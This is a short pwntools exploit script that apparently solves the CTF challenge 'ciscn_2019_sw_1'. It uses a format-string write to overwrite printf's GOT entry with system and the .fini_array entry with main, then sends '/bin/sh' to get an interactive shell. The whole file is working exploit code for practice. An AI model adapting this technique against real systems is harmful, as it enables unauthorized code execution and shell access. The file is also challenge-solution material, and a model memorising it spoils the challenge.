from pwn import *		
context(log_level='debug',os='linux',arch='i386')
pwnfile = './116_ciscn_2019_sw_1'
io=process(pwnfile)
#io=remote('node4.buuoj.cn',26198)
elf = ELF(pwnfile)

offset = 4
main_adr = 0x08048534
#door = 0x0804851B
sys_plt = 0x080483D0
fini_array = 0x0804979C
printf_got = elf.got['printf']	#这里要printf没有调用过或者NO RELRO

pay = p32(printf_got+2)+p32(fini_array+2) #0x8
pay += p32(printf_got)+p32(fini_array) #0x8
pay += b'%'+str(0x0804-0x10).encode("utf-8")+b'c%4$hn'
pay += b'%5$hn'
pay += b'%'+str(0x83D0-0x0804).encode("utf-8")+b'c%6$hn'
pay += b'%'+str(0x8534-0x83D0).encode("utf-8")+b'c%7$hn'

io.sendlineafter("your name?\n",pay)
io.sendlineafter("your name?\n",b'/bin/sh\x00')

io.interactive()
